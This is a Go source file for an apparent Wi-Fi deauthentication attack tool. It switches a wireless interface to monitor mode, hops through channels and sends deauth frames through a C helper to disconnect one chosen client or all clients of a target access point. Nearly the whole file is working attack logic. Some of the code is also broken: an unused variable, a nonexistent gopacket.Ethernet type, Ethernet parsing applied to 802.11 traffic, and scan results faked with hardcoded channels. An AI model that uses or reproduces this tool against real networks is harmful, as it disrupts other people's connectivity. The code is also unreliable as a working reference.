package main

/*
#cgo LDFLAGS: -lpcap -lpthread
#include "deauth.h"
*/
import "C"
import (
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

type Args struct {
	interfaceName string
	targetAP      net.HardwareAddr
	targetClient  net.HardwareAddr
}

var args Args
var handle *pcap.Handle
var stopCapture = make(chan bool)       // Channel to signal stop
var activeChannels = make(map[int]bool) // Store active channels

// Function to set the interface to monitor mode
func setupMonitorMode(interfaceName string) {
	exec.Command("ifconfig", interfaceName, "down").Run()
	exec.Command("iwconfig", interfaceName, "mode", "monitor").Run()
	exec.Command("ifconfig", interfaceName, "up").Run()
	fmt.Printf("Monitor mode enabled on %s\n", interfaceName)
}

// Function to restore the original mode of the network interface
func restoreMode(interfaceName string) {
	exec.Command("iwconfig", interfaceName, "mode", "managed").Run()
}

// Open pcap for packet capture with fallback and retry mechanism
func openPcapWithRetry(interfaceName string, retryCount int) (*pcap.Handle, error) {
	var handle *pcap.Handle
	var err error
	for i := 0; i < retryCount; i++ {
		handle, err = pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
		if err == nil {
			return handle, nil
		}
		log.Printf("Failed to open device %s, attempt %d/%d: %v", interfaceName, i+1, retryCount, err)
		time.Sleep(2 * time.Second)
	}
	return nil, errors.New("could not open pcap handle after multiple attempts")
}

// Function to scan networks and detect active channels
func scanNetworksAndDetectChannels() error {
	cmd := exec.Command("iw", "dev", args.interfaceName, "scan")
	output, err := cmd.Output()
	if err != nil {
		return err
	}

	// Simulating parsing of scan results for demonstration
	// Assume we found the target AP on channel 6 and 11
	activeChannels[6] = true
	activeChannels[11] = true

	fmt.Println("Detected active channels:", activeChannels)
	return nil
}

// Function to control packet capture with channel hopping
func controlledPacketCapture(handle *pcap.Handle) {
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		select {
		case <-stopCapture: // Stop signal received
			return
		case packet := <-packetSource.Packets():
			processPacket(packet)
		}
	}
}

// Refined channel hop function that pauses capture during hops
func refinedChannelHopWithCaptureControl(interfaceName string) {
	for ch := 1; ch <= 13; ch++ {
		stopCapture <- true                // Signal capture stop
		time.Sleep(500 * time.Millisecond) // Small delay before switching
		cmd := exec.Command("iw", "dev", interfaceName, "set", "channel", fmt.Sprintf("%d", ch))
		if err := cmd.Run(); err != nil {
			log.Printf("Error switching channel: %v", err)
		} else {
			fmt.Printf("Switched to channel %d\n", ch)
		}
		go controlledPacketCapture(handle) // Restart capture after channel switch
		time.Sleep(1 * time.Second)
	}
}

// Function to capture packets and process them
func capturePackets() {
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		eth := packet.Layer(gopacket.LayerTypeEthernet)
		if eth == nil {
			continue
		}

		ethernet := eth.(*gopacket.Ethernet)
		// Check if it's from the target AP
		if ethernet.SrcMAC.String() == args.targetAP.String() {
			if args.targetClient != nil {
				// Deauth specific client
				C.send_control_packet((*C.pcap_t)(handle), (*C.u_char)(&args.targetAP[0]), (*C.u_char)(&args.targetClient[0]), C.DEAUTH)
			} else {
				// Deauth all clients
				C.send_control_packet((*C.pcap_t)(handle), (*C.u_char)(&args.targetAP[0]), nil, C.DEAUTH)
			}
		}
	}
}

// Main function
func main() {
	// Command line arguments
	interfaceFlag := flag.String("i", "wlan0", "Network interface")
	apFlag := flag.String("ap", "", "Target Access Point MAC address")
	clientFlag := flag.String("client", "", "Target Client MAC address")
	scanFlag := flag.Bool("scan", false, "Scan for available networks")
	allFlag := flag.Bool("a", false, "Deauth all clients")

	flag.Parse()

	args.interfaceName = *interfaceFlag

	// Set up target AP and client MAC addresses if provided
	if *apFlag != "" {
		parsedAP, err := net.ParseMAC(*apFlag)
		if err != nil {
			log.Fatalf("Invalid AP MAC address: %v", err)
		}
		args.targetAP = parsedAP
	}

	if *clientFlag != "" {
		parsedClient, err := net.ParseMAC(*clientFlag)
		if err != nil {
			log.Fatalf("Invalid Client MAC address: %v", err)
		}
		args.targetClient = parsedClient
	}

	// Setup monitor mode and capture
	setupMonitorMode(args.interfaceName)

	// Handle OS interrupts for cleanup
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		restoreMode(args.interfaceName)
		os.Exit(1)
	}()

	if *scanFlag {
		scanNetworksAndDetectChannels()
	}

	var err error
	handle, err = openPcapWithRetry(args.interfaceName, 3)
	if err != nil {
		log.Fatalf("Could not open device after retries: %v", err)
	}
	defer handle.Close()

	if *allFlag {
		go refinedChannelHopWithCaptureControl(args.interfaceName)
	}

	capturePackets()
}
